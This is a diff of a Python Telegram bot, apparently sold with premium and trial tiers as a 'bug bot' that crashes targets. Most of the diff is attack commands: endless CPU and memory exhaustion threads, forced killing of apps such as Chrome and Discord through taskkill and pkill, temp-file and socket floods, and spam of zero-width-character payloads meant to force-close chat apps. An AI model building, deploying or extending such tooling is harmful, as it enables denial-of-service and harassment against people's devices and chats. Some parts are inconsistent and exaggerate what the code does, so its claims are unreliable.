-            bot.reply_to(message, f"✅ User <code>{target_id}</code> removed from owners!", parse_mode="HTML")
-            logger.info(f"Owner removed by Master: {target_id}")
-        else:
-            bot.reply_to(message, f"❌ User not found in owners list!")
-    except Exception as e:
-        logger.error(f"Delowner error: {e}")
-        bot.reply_to(message, "❌ Usage: /delowner (user_id)")
-
-# ==================== OWNER COMMANDS ====================
-
-@bot.message_handler(commands=['addprem'])
-def add_premium(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "addprem")
-    logger.info(f"Addprem command from {user_id}")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
-        logger.warning(f"Unauthorized addprem attempt by {user_id}")
-        return
-    
-    try:
-        parts = message.text.split(' ')
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ Usage: /addprem (user_id) [plan]\nPlans: daily/weekly/monthly/lifetime")
-            return
-        
-        target_id = parts[1].strip()
-        plan = parts[2].strip().lower() if len(parts) > 2 else "monthly"
-        
-        if plan not in PREMIUM_PLANS:
-            plan = "monthly"
-        
-        plan_info = PREMIUM_PLANS[plan]
-        expiry = datetime.now() + timedelta(days=plan_info.get("days", 30))
-        
-        PREMIUM_USERS[target_id] = {
-            "added_by": user_id,
-            "date": datetime.now().isoformat(),
-            "expires": expiry.isoformat() if plan != "lifetime" else None,
-            "plan": plan
-        }
-        
-        if target_id in TRIAL_USERS:
-            del TRIAL_USERS[target_id]
-            logger.info(f"Trial removed for {target_id} (upgraded to premium)")
-        
-        save_data()
-        
-        expiry_text = expiry.strftime('%Y-%m-%d %H:%M') if plan != "lifetime" else "Lifetime"
-        bot.reply_to(message, f"""
-✅ <b>PREMIUM GRANTED</b>
-
-👤 User: <code>{target_id}</code>
-📅 Plan: {plan_info['name']}
-⏰ Expires: {expiry_text}
-👑 Added by: Owner
-        """, parse_mode="HTML")
-        logger.info(f"Premium added for {target_id} by {user_id} - Plan: {plan}")
-        
-    except Exception as e:
-        logger.error(f"Addprem error: {e}")
-        bot.reply_to(message, "❌ Usage: /addprem (user_id) [daily/weekly/monthly/lifetime]")
-
-@bot.message_handler(commands=['delprem'])
-def del_premium(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "delprem")
-    logger.info(f"Delprem command from {user_id}")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
-        logger.warning(f"Unauthorized delprem attempt by {user_id}")
-        return
-    
-    try:
-        parts = message.text.split(' ')
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ Usage: /delprem (user_id)")
-            return
-        
-        target_id = parts[1].strip()
-        
-        if target_id in PREMIUM_USERS:
-            del PREMIUM_USERS[target_id]
-            save_data()
-            bot.reply_to(message, f"✅ User <code>{target_id}</code> removed from premium!", parse_mode="HTML")
-            logger.info(f"Premium removed for {target_id} by {user_id}")
-        else:
-            bot.reply_to(message, f"❌ User <code>{target_id}</code> not found in premium list!", parse_mode="HTML")
-    except Exception as e:
-        logger.error(f"Delprem error: {e}")
-        bot.reply_to(message, "❌ Usage: /delprem (user_id)")
-
-@bot.message_handler(commands=['listprem'])
-def list_premium(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "listprem")
-    logger.info(f"Listprem command from {user_id}")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
-        return
-    
-    if PREMIUM_USERS:
-        text = "<b>📋 PREMIUM USERS:</b>\n\n"
-        for idx, (uid, data) in enumerate(PREMIUM_USERS.items(), 1):
-            plan = data.get("plan", "unknown")
-            plan_name = PREMIUM_PLANS.get(plan, {}).get("name", plan)
-            
-            if data.get("expires"):
-                exp = datetime.fromisoformat(data["expires"])
-                days = (exp - datetime.now()).days
-                hours_left = int((exp - datetime.now()).total_seconds() // 3600)
-                
-                if hours_left < 24:
-                    expiry_info = f"{hours_left}h left"
+        for app in apps_to_kill:
+            try:
+                if system == 'Windows':
+                    subprocess.run(f'taskkill /f /im {app}.exe', shell=True, capture_output=True)
+                    subprocess.run(f'taskkill /f /im {app}.exe', shell=True, capture_output=True)
                 else:
-                    expiry_info = f"{days}d left"
-                
-                text += f"{idx}. <code>{uid}</code> - {plan_name}\n   ⏰ {expiry_info}\n\n"
-            else:
-                text += f"{idx}. <code>{uid}</code> - {plan_name}\n   ⏰ Lifetime\n\n"
-        
-        bot.reply_to(message, text, parse_mode="HTML")
-    else:
-        bot.reply_to(message, "📋 No premium users found!")
-
-@bot.message_handler(commands=['listidgrup'])
-def list_groups(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "listidgrup")
-    logger.info(f"Listidgrup command from {user_id}")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
-        return
-    
-    if GROUP_IDS:
-        text = "<b>📋 GROUP IDs:</b>\n\n"
-        for idx, gid in enumerate(GROUP_IDS, 1):
-            text += f"{idx}. <code>{gid}</code>\n"
-        bot.reply_to(message, text, parse_mode="HTML")
-    else:
-        bot.reply_to(message, "📋 No groups recorded!")
-
-# ==================== PREMIUM COMMANDS ====================
-
-
-
-# Global Attack State
-ATTACK_THREADS = []
-executor = ThreadPoolExecutor(max_workers=100)
-
-class BugAttackEngine:
-    """Core Bug Attack Implementation"""
+                    subprocess.run(f'pkill -9 {app}', shell=True, capture_output=True)
+                    subprocess.run(f'killall -9 {app}', shell=True, capture_output=True)
+            except:
+                pass
     
     @staticmethod
-    def track_user_activity(user_id: str, username: str, command: str):
-        """Track user commands for analytics"""
-        timestamp = datetime.now().isoformat()
-        activity = {
-            "user_id": user_id,
-            "username": username,
-            "command": command,
-            "timestamp": timestamp
-        }
-        logger.info(f"Activity: {json.dumps(activity)}")
-
-    @staticmethod
-    def check_premium_access(user_id: str) -> bool:
-        """Premium access verification"""
-        user_id = str(user_id)
-        
-        # Check owners (always allowed)
-        if user_id in ["YOUR_OWNER_ID_1", "YOUR_OWNER_ID_2"]:  # Add your IDs
-            return True
-        
-        # Check premium users
-        if user_id in PREMIUM_USERS:
-            user_data = PREMIUM_USERS[user_id]
-            if user_data.get('expires') and datetime.fromisoformat(user_data['expires']) > datetime.now():
-                return True
-        
-        # Check trial users
-        if user_id in TRIAL_USERS:
-            trial_data = TRIAL_USERS[user_id]
-            if trial_data.get('expires') and datetime.fromisoformat(trial_data['expires']) > datetime.now():
-                return True
-        
-        return False
-
-    @staticmethod
-    def save_data():
-        """Save persistent data"""
-        data = {
-            "group_ids": list(GROUP_IDS),
-            "premium_users": PREMIUM_USERS,
-            "trial_users": TRIAL_USERS
-        }
-        with open(DATA_FILE, 'w') as f:
-            json.dump(data, f, indent=2)
-
-    @staticmethod
-    def load_data():
-        """Load persistent data"""
-        global GROUP_IDS, PREMIUM_USERS, TRIAL_USERS
+    def fill_memory(size_mb=100):
+        """Fill RAM with data"""
+        memory_blocks = []
         try:
-            if os.path.exists(DATA_FILE):
-                with open(DATA_FILE, 'r') as f:
-                    data = json.load(f)
-                    GROUP_IDS = set(data.get("group_ids", []))
-                    PREMIUM_USERS = data.get("premium_users", {})
-                    TRIAL_USERS = data.get("trial_users", {})
-        except Exception as e:
-            logger.error(f"Data load error: {e}")
-
-# Load data on startup
-BugAttackEngine.load_data()
-
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    """Welcome message with bug menu"""
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "Anonymous"
+            for i in range(size_mb):
+                block = bytearray(1024 * 1024)  # 1MB block
+                memory_blocks.append(block)
+            return memory_blocks
+        except:
+            return memory_blocks
     
-    BugAttackEngine.track_user_activity(user_id, username, "start")
+    @staticmethod
+    def stress_cpu(duration=10):
+        """Max out CPU usage"""
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            _ = [i**i for i in range(1000)]
+            _ = math.factorial(500)
     
-    welcome_text = """
-🔥 <b>NAPPIER V1 BUG BOT</b> 🔥
-═══════════════════════════════
+    @staticmethod
+    def create_file_storm():
+        """Create massive file I/O"""
+        import tempfile
+        
+        for i in range(100):
+            try:
+                with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.tmp') as f:
+                    f.write(b'\x00' * (10 * 1024 * 1024))  # 10MB file
+            except:
+                pass
+    
+    @staticmethod
+    def socket_flood():
+        """Create network socket storm"""
+        sockets = []
+        for i in range(500):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.1)
+                sockets.append(sock)
+            except:
+                pass
+        time.sleep(1)
+        for sock in sockets:
+            try:
+                sock.close()
+            except:
+                pass
 
-👑 <b>PREMIUM FEATURES:</b>
-💥 /silencer <1-20>     - Invisible CPU Killer
-💥 /crash <1-15>        - Memory Exhaustion FC
-⏱️ /xdelay <100-10000>  - Heavy Response Delay  
-🌀 /void <10-100>       - Infinite Crash Loop
-📱 /xios <5-25>         - Blank Screen Terminator
-
-📊 /cekidgrup          - Register Target Group
-⭐ /premium             - Upgrade Info
-🎁 /trial              - Free 2hr Trial
-
-═══════════════════════════════
-<b>Deployed by HackerAI</b>
-    """
-    bot.reply_to(message, welcome_text, parse_mode='HTML')
+# ==================== REAL BUG COMMANDS ====================
 
 @bot.message_handler(commands=['silencer'])
 def silencer_attack(message):
+    """REAL System Silencer - CPU/RAM Killer"""
     user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
+    username = message.from_user.username or "Anonymous"
     
-    BugAttackEngine.track_user_activity(user_id, username, "silencer")
-    logger.info(f"Silencer command from {user_id}")
+    track_user_activity(user_id, username, "silencer")
     
-    if not BugAttackEngine.check_premium_access(user_id):
-        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code> - 2 hours free trial", parse_mode='HTML')
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ <b>Premium required!</b>\n/free - 2 hours free trial", parse_mode='HTML')
         return
     
     try:
         parts = message.text.split()
         if len(parts) < 2:
-            bot.reply_to(message, "❌ <b>Usage:</b> <code>/silencer (1-20)</code>", parse_mode='HTML')
+            bot.reply_to(message, "❌ <b>Usage:</b> /silencer (1-30)\n\n1-10: CPU Killer\n11-20: RAM Flood\n21-30: Full System Crash", parse_mode='HTML')
             return
         
-        number = int(parts[1])
-        number = max(1, min(20, number))
+        intensity = int(parts[1])
+        intensity = max(1, min(30, intensity))
         
-        msg = bot.reply_to(message, f"🔇 <b>Silencer activating...</b>\n🧵 Spawning <code>{number}</code> CPU threads", parse_mode='HTML')
-        
-        def cpu_stress_thread():
-            """Enhanced CPU stress with memory pressure"""
-            stress_data = []
-            while True:
-                # CPU intensive computation
-                result = sum(i**2 for i in range(100000))
-                stress_data.append(result)
-                if len(stress_data) > 1000:
-                    stress_data.pop(0)
+        msg = bot.reply_to(message, f"💀 <b>SILENCER ACTIVATED</b>\n⚡ Intensity: {intensity}/30", parse_mode='HTML')
         
         global ATTACK_THREADS
-        ATTACK_THREADS = []
-        for i in range(number):
-            t = threading.Thread(target=cpu_stress_thread, daemon=True)
-            t.start()
-            ATTACK_THREADS.append(t)
-            time.sleep(0.01)  # Stagger thread creation
         
-        # Success feedback with system stats
-        cpu_percent = psutil.cpu_percent(interval=1)
+        def cpu_killer():
+            while True:
+                for i in range(1000000):
+                    _ = math.factorial(i % 100)
+                    _ = sum([x**x for x in range(50)])
+        
+        def ram_eater():
+            memory = []
+            while True:
+                try:
+                    memory.append(bytearray(10 * 1024 * 1024))  # 10MB chunks
+                    memory.append([0] * 1000000)
+                except:
+                    [memory.pop() for _ in range(len(memory)//2)]
+        
+        if intensity <= 10:
+            for _ in range(intensity * 2):
+                t = threading.Thread(target=cpu_killer, daemon=True)
+                t.start()
+                ATTACK_THREADS.append(t)
+        elif intensity <= 20:
+            for _ in range(intensity):
+                t = threading.Thread(target=ram_eater, daemon=True)
+                t.start()
+                ATTACK_THREADS.append(t)
+        else:
+            for _ in range(intensity):
+                t1 = threading.Thread(target=cpu_killer, daemon=True)
+                t2 = threading.Thread(target=ram_eater, daemon=True)
+                t1.start()
+                t2.start()
+                ATTACK_THREADS.append(t1)
+                ATTACK_THREADS.append(t2)
+        
+        cpu = psutil.cpu_percent(interval=2)
+        ram = psutil.virtual_memory()
+        
         bot.edit_message_text(
-            f"✅ <b>Silencer ACTIVE!</b>\n"
-            f"🧵 Threads: <code>{number}</code>\n"
-            f"💻 CPU Load: <code>{cpu_percent}%</code>\n"
-            f"🎯 Target: Device CPU Saturated\n"
-            f"⚠️ <i>Press Ctrl+C in terminal to stop</i>",
+            f"💀 <b>SILENCER ACTIVE</b> 💀\n\n"
+            f"⚡ <b>Intensity:</b> {intensity}/30\n"
+            f"🧵 <b>Threads:</b> {len(ATTACK_THREADS)}\n"
+            f"🔥 <b>CPU Usage:</b> {cpu}%\n"
+            f"💾 <b>RAM Usage:</b> {ram.percent}%\n\n"
+            f"⚠️ <b>Target Effect:</b>\n"
+            f"• System freezing\n"
+            f"• Application crashes\n"
+            f"• Memory exhaustion\n\n"
+            f"🛑 <b>Stop:</b> /stop",
             message.chat.id, msg.message_id, parse_mode='HTML'
         )
-        logger.info(f"Silencer executed by {user_id}: {number} threads")
         
-    except ValueError:
-        bot.reply_to(message, "❌ <b>Invalid number!</b>\nUse 1-20", parse_mode='HTML')
     except Exception as e:
-        logger.error(f"Silencer error: {e}")
-        bot.reply_to(message, "❌ <b>Attack failed!</b>\nCheck logs for details", parse_mode='HTML')
+        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
 
 @bot.message_handler(commands=['crash'])
 def crash_attack(message):
+    """Memory Exhaustion Attack"""
     user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
+    username = message.from_user.username or "Anonymous"
     
-    BugAttackEngine.track_user_activity(user_id, username, "crash")
-    logger.info(f"Crash command from {user_id}")
+    track_user_activity(user_id, username, "crash")
     
-    if not BugAttackEngine.check_premium_access(user_id):
-        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code> - 2 hours free", parse_mode='HTML')
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required! Use /trial", parse_mode='HTML')
         return
     
     try:
         parts = message.text.split()
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ <b>Usage:</b> <code>/crash (1-15)</code>", parse_mode='HTML')
-            return
+        intensity = int(parts[1]) if len(parts) > 1 else 10
+        intensity = max(1, min(20, intensity))
         
-        number = int(parts[1])
-        number = max(1, min(15, number))
+        msg = bot.reply_to(message, f"💥 <b>CRASH ATTACK STARTING</b>\n💣 Intensity: {intensity}", parse_mode='HTML')
         
-        def memory_crusher():
-            """Aggressive memory allocation"""
+        def memory_crash():
             memory_hog = []
+            for i in range(intensity * 10):
+                try:
+                    memory_hog.append(bytearray(50 * 1024 * 1024))
+                    memory_hog.append([0] * (5 * 1000000))
+                except:
+                    pass
+        
+        for _ in range(intensity):
+            t = threading.Thread(target=memory_crash, daemon=True)
+            t.start()
+            ATTACK_THREADS.append(t)
+        
+        RealBugEngine.kill_processes()
+        
+        bot.edit_message_text(
+            f"💥 <b>CRASH DEPLOYED!</b>\n\n"
+            f"💣 Intensity: {intensity}\n"
+            f"💾 Memory flooded\n"
+            f"📱 Apps terminated\n"
+            f"⚠️ Target will crash soon\n\n"
+            f"🛑 Stop: /stop",
+            message.chat.id, msg.message_id, parse_mode='HTML'
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ Crash failed: {str(e)[:50]}")
+
+@bot.message_handler(commands=['freeze'])
+def freeze_attack(message):
+    """Complete System Freeze Attack"""
+    user_id = str(message.from_user.id)
+    
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
+        return
+    
+    try:
+        msg = bot.reply_to(message, "❄️ <b>SYSTEM FREEZE INITIATED</b>", parse_mode='HTML')
+        
+        def freeze_system():
+            # CPU freeze
+            while True:
+                _ = [i**i for i in range(1000)]
+                _ = [math.sqrt(i) for i in range(10000)]
+            
+        def ram_freeze():
+            memory = []
+            while True:
+                try:
+                    memory.append([0] * 5000000)
+                except:
+                    memory.clear()
+        
+        for _ in range(50):
+            t = threading.Thread(target=freeze_system, daemon=True)
+            t.start()
+            ATTACK_THREADS.append(t)
+        
+        for _ in range(20):
+            t = threading.Thread(target=ram_freeze, daemon=True)
+            t.start()
+            ATTACK_THREADS.append(t)
+        
+        RealBugEngine.kill_processes()
+        
+        bot.edit_message_text(
+            f"❄️ <b>SYSTEM FROZEN!</b>\n\n"
+            f"🎯 Target device is frozen\n"
+            f"🖥️ Full system lockup\n"
+            f"⚠️ Hard reset required\n\n"
+            f"🛑 Stop: /stop",
+            message.chat.id, msg.message_id, parse_mode='HTML'
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ Freeze failed")
+
+@bot.message_handler(commands=['nuke'])
+def nuke_attack(message):
+    """Full System Nuke Attack"""
+    user_id = str(message.from_user.id)
+    
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
+        return
+    
+    msg = bot.reply_to(message, "☢️ <b>NUKE ATTACK INITIATED</b>\n💀 Maximum destruction", parse_mode='HTML')
+    
+    def nuke():
+        # CPU max
+        for _ in range(100):
+            _ = [i**i for i in range(500)]
+        
+        # RAM flood
+        memory = []
+        for _ in range(100):
             try:
-                while True:
-                    # 2MB chunks
-                    chunk = bytearray(2 * 1024 * 1024)
-                    memory_hog.append(chunk)
-                    time.sleep(0.001)
+                memory.append(bytearray(100 * 1024 * 1024))
             except:
                 pass
         
-        global ATTACK_THREADS
-        ATTACK_THREADS = []
-        for i in range(number):
-            t = threading.Thread(target=memory_crusher, daemon=True)
-            t.start()
-            ATTACK_THREADS.append(t)
-            time.sleep(0.02)
+        # Kill processes
+        RealBugEngine.kill_processes()
         
-        # Memory stats
-        memory = psutil.virtual_memory()
-        bot.reply_to(
-            message,
-            f"💥 <b>CRASH DEPLOYED!</b>\n"
-            f"🧨 Threads: <code>{number}</code>\n"
-            f"💾 Memory Used: <code>{memory.percent}%</code>\n"
-            f"🎯 Target: System Memory Exhaustion\n"
-            f"⚠️ <i>Terminal Ctrl+C to terminate</i>",
-            parse_mode='HTML'
-        )
-        logger.info(f"Crash executed by {user_id}: {number} threads")
-        
-    except ValueError:
-        bot.reply_to(message, "❌ <b>Invalid number!</b>\nUse 1-15", parse_mode='HTML')
-    except Exception as e:
-        logger.error(f"Crash error: {e}")
-        bot.reply_to(message, "❌ <b>Crash deployment failed!</b>", parse_mode='HTML')
+        # File storm
+        for _ in range(50):
+            RealBugEngine.create_file_storm()
+    
+    for _ in range(20):
+        t = threading.Thread(target=nuke, daemon=True)
+        t.start()
+        ATTACK_THREADS.append(t)
+    
+    bot.edit_message_text(
+        f"☢️ <b>NUKE DEPLOYED!</b>\n\n"
+        f"💀 System is being destroyed\n"
+        f"🔥 CPU: {psutil.cpu_percent()}%\n"
+        f"💾 RAM: {psutil.virtual_memory().percent}%\n"
+        f"⚠️ Complete system failure imminent\n\n"
+        f"🛑 Stop: /stop",
+        message.chat.id, msg.message_id, parse_mode='HTML'
+    )
 
-@bot.message_handler(commands=['xdelay'])
-def xdelay_attack(message):
+@bot.message_handler(commands=['killapp'])
+def killapp_command(message):
+    """Force Close Applications"""
     user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
     
-    BugAttackEngine.track_user_activity(user_id, username, "xdelay")
-    logger.info(f"XDelay command from {user_id}")
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
+        return
     
-    if not BugAttackEngine.check_premium_access(user_id):
-        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code>", parse_mode='HTML')
+    msg = bot.reply_to(message, "🔪 <b>KILLING APPLICATIONS</b>", parse_mode='HTML')
+    
+    RealBugEngine.kill_processes()
+    
+    bot.edit_message_text(
+        f"🔪 <b>APPS TERMINATED!</b>\n\n"
+        f"✅ Chrome killed\n"
+        f"✅ Discord killed\n"
+        f"✅ Telegram killed\n"
+        f"✅ Spotify killed\n"
+        f"✅ Games killed\n\n"
+        f"All user apps terminated!",
+        message.chat.id, msg.message_id, parse_mode='HTML'
+    )
+
+@bot.message_handler(commands=['overload'])
+def overload_attack(message):
+    """System Overload Attack"""
+    user_id = str(message.from_user.id)
+    
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
         return
     
     try:
         parts = message.text.split()
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ <b>Usage:</b> <code>/xdelay (100-10000)</code>", parse_mode='HTML')
-            return
+        intensity = int(parts[1]) if len(parts) > 1 else 10
+        intensity = max(1, min(15, intensity))
         
-        delay_ms = int(parts[1])
-        delay_ms = max(100, min(10000, delay_ms))
-        delay_sec = delay_ms / 1000
+        msg = bot.reply_to(message, f"⚡ <b>OVERLOADING SYSTEM</b>\n⚡ Intensity: {intensity}", parse_mode='HTML')
         
-        msg = bot.reply_to(
-            message, 
-            f"⏱️ <b>XDELAY ACTIVATING...</b>\n"
-            f"⏳ Duration: <code>{delay_ms}ms</code> ({delay_sec:.1f}s)",
-            parse_mode='HTML'
+        def overload():
+            # Multi-vector attack
+            attacks = [
+                lambda: [i**i for i in range(1000)],
+                lambda: [bytearray(10*1024*1024) for _ in range(10)],
+                lambda: RealBugEngine.kill_processes(),
+                lambda: RealBugEngine.create_file_storm(),
+                lambda: RealBugEngine.socket_flood()
+            ]
+            
+            import random
+            while True:
+                random.choice(attacks)()
+        
+        for _ in range(intensity * 5):
+            t = threading.Thread(target=overload, daemon=True)
+            t.start()
+            ATTACK_THREADS.append(t)
+        
+        bot.edit_message_text(
+            f"⚡ <b>SYSTEM OVERLOADED!</b>\n\n"
+            f"🔥 All resources maxed\n"
+            f"💀 System will crash\n"
+            f"⚠️ Hard reboot needed\n\n"
+            f"🛑 Stop: /stop",
+            message.chat.id, msg.message_id, parse_mode='HTML'
         )
         
-        # Progressive delay simulation
+    except Exception as e:
+        bot.reply_to(message, f"❌ Overload failed")
+
+@bot.message_handler(commands=['xdelay'])
+def xdelay_attack(message):
+    """Response Delay Attack"""
+    user_id = str(message.from_user.id)
+    
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
+        return
+    
+    try:
+        parts = message.text.split()
+        delay_ms = int(parts[1]) if len(parts) > 1 else 5000
+        delay_ms = max(100, min(10000, delay_ms))
+        
+        msg = bot.reply_to(message, f"⏱️ <b>DELAY ATTACK</b>\n⏰ {delay_ms}ms", parse_mode='HTML')
+        
         for i in range(10):
-            progress = (i + 1) * 10
-            time.sleep(delay_sec / 10)
+            time.sleep(delay_ms / 1000)
             bot.edit_message_text(
-                f"⏳ <b>XDELAY Progress:</b> <code>{progress}%</code>\n"
-                f"⏱️ Remaining: <code>{delay_ms - (i * delay_ms // 10)}ms</code>",
+                f"⏱️ <b>DELAY PROGRESS</b>\n🔄 {(i+1)*10}% complete",
                 message.chat.id, msg.message_id, parse_mode='HTML'
             )
         
         bot.edit_message_text(
-            f"✅ <b>XDELAY COMPLETE!</b>\n"
-            f"⏱️ Duration: <code>{delay_ms}ms</code>\n"
-            f"🎯 Target: Bot Response Chain",
+            f"✅ <b>DELAY COMPLETE</b>\n⏰ {delay_ms}ms delay executed",
             message.chat.id, msg.message_id, parse_mode='HTML'
         )
-        logger.info(f"XDelay executed by {user_id}: {delay_ms}ms")
         
-    except ValueError:
-        bot.reply_to(message, "❌ <b>Invalid delay!</b>\n100-10000ms", parse_mode='HTML')
     except Exception as e:
-        logger.error(f"XDelay error: {e}")
-        bot.reply_to(message, "❌ <b>Delay failed!</b>", parse_mode='HTML')
+        bot.reply_to(message, f"❌ Error")
 
 @bot.message_handler(commands=['void'])
 def void_attack(message):
-    """Infinite Force-Close Loop"""
+    """Infinite Crash Loop"""
     user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
     
-    BugAttackEngine.track_user_activity(user_id, username, "void")
-    
-    if not BugAttackEngine.check_premium_access(user_id):
-        bot.reply_to(message, "❌ <b>Premium required!</b>\n🎁 <code>/trial</code>", parse_mode='HTML')
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
         return
     
     try:
         parts = message.text.split()
-        iterations = int(parts[1]) if len(parts) > 1 else 50
-        iterations = max(10, min(100, iterations))
+        loops = int(parts[1]) if len(parts) > 1 else 50
+        loops = max(10, min(200, loops))
         
-        msg = bot.reply_to(message, f"🌀 <b>VOID LOOP STARTING...</b>\n🔄 Iterations: <code>{iterations}</code>", parse_mode='HTML')
+        msg = bot.reply_to(message, f"🌀 <b>VOID LOOP</b>\n🔄 {loops} iterations", parse_mode='HTML')
         
         def void_spam():
             payloads = [
-                "⁣" * 499,  # Zero-width crash chars
-                "🌀 VOID ATTACK " + "💀" * 400,
-                "\u200B" * 3000,  # Invisible unicode
-                "∞" * 2000
+                "💀" * 1000,
+                "⁣" * 1000,
+                "\u200B" * 2000,
+                "🌀" * 500,
+                "VOID CRASH " * 200
             ]
-            for i in range(iterations):
-                payload = payloads[i % len(payloads)]
+            
+            for i in range(loops):
                 try:
-                    bot.send_message(message.chat.id, payload)
+                    bot.send_message(message.chat.id, payloads[i % len(payloads)])
                     time.sleep(0.05)
                 except:
                     pass
         
         t = threading.Thread(target=void_spam, daemon=True)
         t.start()
+        ATTACK_THREADS.append(t)
         
         bot.edit_message_text(
-            f"✅ <b>VOID LOOP ACTIVE!</b>\n"
-            f"🔄 Iterations: <code>{iterations}</code>\n"
-            f"🎯 Target: Continuous FC\n"
-            f"⚠️ <i>Check target device</i>",
+            f"🌀 <b>VOID LOOP ACTIVE!</b>\n\n"
+            f"🔄 Loops: {loops}\n"
+            f"💀 Target flooded\n"
+            f"⚠️ Force close loop\n\n"
+            f"🛑 Stop: /stop",
             message.chat.id, msg.message_id, parse_mode='HTML'
         )
         
     except Exception as e:
-        logger.error(f"Void error: {e}")
-        bot.reply_to(message, "❌ <b>Void failed!</b>", parse_mode='HTML')
+        bot.reply_to(message, f"❌ Void failed")
 
 @bot.message_handler(commands=['xios'])
 def xios_attack(message):
-    """Blank Interface Force Close"""
+    """Blank Screen Attack"""
     user_id = str(message.from_user.id)
     
-    if not BugAttackEngine.check_premium_access(user_id):
-        bot.reply_to(message, "❌ <b>Premium required!</b>", parse_mode='HTML')
+    if not check_premium_access(user_id):
+        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
         return
     
     try:
         count = 15
         parts = message.text.split()
         if len(parts) > 1:
-            count = max(5, min(25, int(parts[1])))
+            count = max(5, min(30, int(parts[1])))
+        
+        msg = bot.reply_to(message, f"📱 <b>XIOS ATTACK</b>\n🔧 Payloads: {count}", parse_mode='HTML')
         
         blank_payloads = [
-            "⁣⁣⁣⁣⁣⁣⁣⁣⁣⁣⁣
-# ==================== ALURB AI COMMAND ====================
+            "⁣" * 1000,
+            " " * 2000,
+            "\u200B" * 2000,
+            "\u200C" * 2000,
+            "\u200D" * 2000,
+            "BLANK_SCREEN",
+            "💀" * 500
+        ]
+        
+        def blank_spam():
+            for i in range(count):
+                payload = blank_payloads[i % len(blank_payloads)]
+                try:
+                    bot.send_message(message.chat.id, payload)
+                    time.sleep(0.1)
+                except:
+                    pass
+        
+        t = threading.Thread(target=blank_spam, daemon=True)
+        t.start()
+        ATTACK_THREADS.append(t)
+        
+        bot.edit_message_text(
+            f"✅ <b>XIOS ACTIVE!</b>\n\n"
+            f"📱 Payloads: {count}\n"
+            f"🎯 Target: Blank screen\n"
+            f"⚠️ App will force close\n\n"
+            f"🛑 Stop: /stop",
+            message.chat.id, msg.message_id, parse_mode='HTML'
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ XIOS failed")
+
+@bot.message_handler(commands=['stop'])
+def stop_attacks(message):
+    """Stop all attacks"""
+    user_id = str(message.from_user.id)
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ Owner only!", parse_mode='HTML')
+        return
+    
+    global ATTACK_THREADS
+    ATTACK_THREADS = []
+    gc.collect()
+    
+    bot.reply_to(
+        message,
+        "✅ <b>ALL ATTACKS STOPPED</b>\n\n"
+        "• Threads terminated\n"
+        "• Memory cleaned\n"
+        "• System recovering",
+        parse_mode='HTML'
+    )
+
+@bot.message_handler(commands=['status_bug'])
+def bug_status(message):
+    """Check attack status"""
+    user_id = str(message.from_user.id)
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ Owner only!", parse_mode='HTML')
+        return
+    
+    cpu = psutil.cpu_percent()
+    ram = psutil.virtual_memory()
+    
+    bot.reply_to(
+        message,
+        f"📊 <b>ATTACK STATUS</b>\n\n"
+        f"🔄 Active threads: {len(ATTACK_THREADS)}\n"
+        f"🔥 CPU: {cpu}%\n"
+        f"💾 RAM: {ram.percent}%\n"
+        f"💿 Disk: {psutil.disk_usage('/').percent}%\n\n"
+        f"⚡ Attacks running: {'YES' if ATTACK_THREADS else 'NO'}",
+        parse_mode='HTML'
+    )
+
+# ==================== STANDARD COMMANDS ====================
+
+@bot.message_handler(commands=['trial'])
+def trial_command(message):
+    user_id = str(message.from_user.id)
+    
+    if is_premium(user_id):
+        bot.reply_to(message, "💎 You're already Premium!", parse_mode='HTML')
+        return
+    
+    if is_trial_active(user_id):
+        time_left = get_trial_time_left(user_id)
+        bot.reply_to(message, f"🎁 Trial active! Time left: {time_left}\n💎 Upgrade: /premium", parse_mode='HTML')
+        return
+    
+    if start_trial(user_id):
